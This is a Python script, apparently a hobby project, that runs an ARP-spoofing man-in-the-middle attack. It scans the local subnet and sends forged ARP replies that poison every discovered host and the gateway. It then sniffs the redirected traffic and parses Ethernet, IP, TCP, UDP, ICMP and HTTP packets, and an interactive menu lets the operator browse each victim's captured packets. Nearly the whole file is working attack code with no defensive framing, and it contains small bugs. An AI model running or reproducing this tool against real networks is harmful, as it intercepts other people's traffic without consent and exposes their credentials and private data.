import socket
import struct
import uuid
import codecs
import binascii
from tabnanny import verbose
import psutil
import time
import os
from scapy.all import *
import scapy.config
import scapy.layers.l2
import scapy.route
import sys
import netifaces


from scapy.layers.l2 import ARP, Ether

#os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def get_default_gateway():
    """ python style if it exists there is a python lib that can do it in 3 lines of code """
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    return default_gateway

#return poperly formated mac adress
def get_mac_adress(bytes_addres):
    bytes_string = map('{:02x}'.format, bytes_addres)
    mac_adress = ':'.join(bytes_string).upper()
    return mac_adress

host_ip = socket.gethostbyname(socket.gethostname())
host_mac = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big')).upper()
gateway_ip = get_default_gateway()
gateway_mac = ''

# Return proper IPv4 addres
def ipv4(addres):
    return '.'.join(map(str, addres))

def parse_http(data):
    try:
        return data.decode('utf-8')
    except UnicodeDecodeError:
        return data.decode('latin1', errors='ignore')

class Ethernet_frame():
    def __init__(self, data):
        dest_mac, source_mac, proto = struct.unpack('! 6s 6s H', data[:14])
        self.dest_mac, self.source_mac, self.eth_proto, self.data = get_mac_adress(dest_mac), get_mac_adress(source_mac), socket.htons(proto), data[14:]
        self.type = 'Ethernet_frame'
    def print_values(self):
        print('Ethernet Frame')
        print('Destination: {}, Source: {}, Protocol: {}'.format(self.dest_mac, self.source_mac, self.eth_proto))

class IPv4_packet(Ethernet_frame):
    def __init__(self, data):
        Ethernet_frame.__init__(self, data)
        version_header_length = self.data[0]
        self.version  = version_header_length >> 4
        self.header_length = (version_header_length & 15) * 4
        self.time_to_live, self.proto, src, target = struct.unpack('! 8x B B 2x 4s 4s', self.data[:20])
        self.src, self.target, self.data = ipv4(src), ipv4(target), self.data[self.header_length:]
        self.type = 'IPv4_packet'
    def print_values(self):
        Ethernet_frame.print_values(self)
        if (self.eth_proto == 8):
            print('IPv4 packet:')
            print('Version: {}, Header lenght: {}, time to live: {}'.format(self.version, self.header_length, self.time_to_live))
            print('Protocol: {}, Source: {}, Target: {}'.format(self.proto, self.src, self.target))

class ARP_packet(Ethernet_frame):
    def __init__(self, data):
        Ethernet_frame.__init__(self, data)
        self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation, b_SHA, b_SPA, b_THA, b_TPA = struct.unpack('! H H B B H 6s 4s 6s 4s', self.data)
        self.SHA, self.SPA, self.THA, self.TPA = get_mac_adress(b_SHA), ipv4(b_SPA), get_mac_adress(b_THA), ipv4(b_TPA)
        self.type = 'ARP_packet'
    def print_values(self):
        Ethernet_frame.print_values(self)
        print("ARP request:")
        print('HTYPE: {}, PTYPE: {}, HLEN: {}, PLEN: {}, operation: {}'.format(self.HTYPE, self.PTYPE, self.HLEN, self.PLEN, self.operation))
        print('SHA: {}, SPA: {}, THA: {}, TPA: {}'.format(self.SHA, self.SPA, self.THA, self.TPA))

class ICMP(IPv4_packet):
    def __init__(self, data):
        IPv4_packet.__init__(self, data)
        self.icmp_type, self.code, self.checksumm = struct.unpack('! B B H', self.data[:4])
        self.data = self.data[4:]
        self.type = 'ICMP'
    def print_values(self):
        IPv4_packet.print_values(self)
        print('ICMP packet:')
        print('ICMP type: {}, Code: {}, Checksumm: {}'.format(self.icmp_type, self.code, self.checksumm))


class TCP(IPv4_packet):
    def __init__(self, data):
        IPv4_packet.__init__(self, data)
        self.src_port, self.dest_port, self.sequence, self.aknowledgment, self.offset_reseved_flags = struct.unpack('! H H L L H', self.data[:14])
        offset = (self.offset_reseved_flags >> 12) * 4
        self.flag_urg = (self.offset_reseved_flags & 32) >> 5
        self.flag_ack = (self.offset_reseved_flags & 16) >> 4
        self.flag_psh = (self.offset_reseved_flags & 8) >> 3
        self.flag_rst = (self.offset_reseved_flags & 4) >> 2
        self.flag_syn = (self.offset_reseved_flags & 2) >> 1
        self.flag_fin = self.offset_reseved_flags & 1
        self.data = self.data[offset:]
        self.type = 'TCP'
    def print_values(self):
        IPv4_packet.print_values(self)
        print('TCP packet:')
        print('Source port: {}, Destination port: {}'.format(self.src_port, self.dest_port))
        print('Sequence: {}, aknowledgment: {}'.format(self.sequence, self.aknowledgment))
        print('Flags:')
        print('URG: {}, ACK: {}, PSH: {}, SYN: {}, FIN: {}'.format(self.flag_urg, self.flag_ack, self.flag_psh, self.flag_rst, self.flag_syn, self.flag_fin))

class UDP(IPv4_packet):
    def __init__(self, data):
        IPv4_packet.__init__(self, data)
        self.src_port, self.dest_port, self.size = struct.unpack('! H H 2x H', self.data[:8])
        self.data = self.data[8:]
        self.type = 'UDP'
    def print_values(self):
        IPv4_packet.print_values(self)
        print('UDP packet:')
        print('Source port: {}, Destination port: {}, Size: {}'.format(self.src_port, self.dest_port, self.size))

class HTTP(TCP):
    def __init__(self, data):
        TCP.__init__(self, data)
        self.http_string = parse_http(self.data)
        self.type = 'HTTP'
    def print_values(self):
        TCP.print_values(self)
        print('HTTP request:')
        print('HTTP string: {}'.format(self.http_string))


def factory(data):
    obj = Ethernet_frame(data)
    if (obj.eth_proto == 8 and len(obj.data) >= 20):
        obj = IPv4_packet(data)
        if (obj.proto == 1 and len(obj.data) >= 4):
            obj = ICMP(data)
        elif (obj.proto == 6 and len(obj.data) >= 14):
            obj = TCP(data)
            if (b'HTTP' in obj.data and len(obj.data) > 0):
                obj = HTTP(data)
        elif (obj.proto == 6 and len(obj.data) >= 8):
            obj = UDP(data)
    elif (obj.eth_proto == 1544 and len(obj.data) == 28):
        obj = ARP_packet(data)
    return obj


def long2net(arg):
    if (arg <= 0 or arg >= 0xFFFFFFFF):
        raise ValueError("illegal netmask value", hex(arg))
    return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))


def to_CIDR_notation(bytes_network, bytes_netmask):
    network = scapy.utils.ltoa(bytes_network)
    netmask = long2net(bytes_netmask)
    net = "%s/%s" % (network, netmask)
    if netmask < 16:
        return None
    return net

def scan(net, interface, timeout=5):
    ret = []
    try:
        ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
        for s, r in ans.res:
            line = [r.src, r.psrc]
            try:
                ret.append(line)
            except socket.herror:
                pass
    except socket.error as e:
        raise
    return ret

class Client():
    def __init__(self, ip, mac):
        self.ip = ip
        self.mac = mac
        self.type = (self.ip == host_ip or self.ip == gateway_ip)
        self.packets = []
        self.arp_packets = 0
    def spoof(self):
        send(Ether(dst=self.mac)/ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = host_mac), verbose=False)
        send(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc = host_mac), verbose=False)
    def restore(self):
        send(Ether(dst=self.mac)/ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = gateway_mac), verbose=False)
        send(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc=self.mac), verbose=False)
    def fire(self):
        try:
            self.spoof()
        except:
            self.restore()

class IPtable():
    def __init__(self, host_mac, host_ip, gateway_ip, gateway_mac):
        self.mac = host_mac
        self.ip = host_ip
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]
        self.unreg_packets = []

    def find(self, client):
        for i, c in enumerate(self.clients):
            if (c.ip == client.ip):
                return i
        return -1

    def find_mac(self, mac):
        if (mac == gateway_mac):
            return 1
        if (mac == host_mac):
            return 0
        for i in range(len(self.clients)):
            if (self.clients[i].mac == mac):
                return i
        return -1
    def find_ip(self, ip):
        if (ip == gateway_ip):
            return 1
        if (ip == host_ip):
            return 0
        for i in range(len(self.clients)):
            if (self.clients[i].ip == ip):
                return i
        return -1

    def emplase(self, client):
        if (self.find(client) == -1):
            self.clients.append(client)

    def scan(self):
        ips = []
        for network, netmask, _, interface, address, _ in scapy.config.conf.route.routes:
            # skip loopback network and default gw
            if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
                continue
            if netmask <= 0 or netmask == 0xFFFFFFFF:
                continue
            # skip docker interface
            if (interface.startswith('docker')
                    or interface.startswith('br-')
                    or interface.startswith('tun')):
                continue
            net = to_CIDR_notation(network, netmask)
            if net:   
                i = scan(net, interface)
                for line in i:
                    ips.append([line[0].upper(), line[1]])
        for i in ips:
            self.emplase(Client(i[1], i[0]))

    def attack(self):
        for client in self.clients:
            if (client.type == False):
                for i in range(20):
                    client.fire()

    def restore(self):
        for client in self.clients:
            if (client.type == False):
                for i in range(20):
                    client.restore()

    def insert_packet(self, data):
        packet = factory(data)
        if packet.type != 'Ethernet_frame' and packet.type != 'ARP_packet':
            client_id = self.find_ip(packet.src)
            if (client_id != -1):
                self.clients[client_id].packets.append(packet)
                return
        client_id = self.find_mac(packet.source_mac)
        if (client_id != -1):
            self.clients[client_id].packets.append(packet)
            return
        self.unreg_packets.append(packet)
        return;


def Sniff(Ips):
    sniff(prn=lambda x: Ips.insert_packet(x.do_build()), count=0)


if __name__ == '__main__':
    gateway_mac = getmacbyip(gateway_ip).upper()
    Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
    Ips.scan()
    th_sniff = threading.Thread(target=Sniff, args=(Ips, ), daemon=True)
    th_sniff.start()
    try:
        Ips.attack()
        command = ''
        while (command != 'exit'):
            command = input('input command: ')
            if command == 'help':
                print("print 'ips' to get list of ips")
                print("print 'packets' to get list of spoofed packets")
                print("print 'exit' to exit")
            if command == 'ips':
                for i in Ips.clients:
                    print(i.ip, i.mac)
            if command == 'packets':
                for i in range(len(Ips.clients)):
                    print(i + 1, Ips.clients[i].ip, len(Ips.clients[i].packets))
                print(len(Ips.clients) + 1, 'other', len(Ips.unreg_packets))
                a = ""
                while( a != 'back' and (a.isdigit() == False or (int(a) < 1 and int(a) >= len(Ips.clients)))):
                    a = input('choose target ip:')
                if a == 'back':
                    continue
                if int(a) == len(Ips.clients) + 1:
                    for i in Ips.unreg_packets:
                        i.print_values()
                    continue
                a = int(a) - 1
                for i in Ips.clients[a].packets:
                    i.print_values()
                    #print(i.data)
        Ips.restore()
    except:
        Ips.restore()